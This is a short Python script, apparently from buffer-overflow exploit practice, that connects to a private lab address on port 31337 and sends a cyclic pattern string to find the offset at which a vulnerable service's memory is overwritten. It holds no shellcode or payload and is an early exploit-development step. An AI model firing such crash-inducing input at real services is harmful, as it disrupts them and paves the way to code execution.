#!/usr/bin/python3
import socket

ip = "10.100.2.6"
port = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

buffer = (
    "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9"
    "Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9"
    "Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"
    "Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9"
    "Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"
    "Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"
    "Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")

# Convert string → bytes
buffer = buffer.encode()

# Send all bytes
s.send(buffer)

s.close()
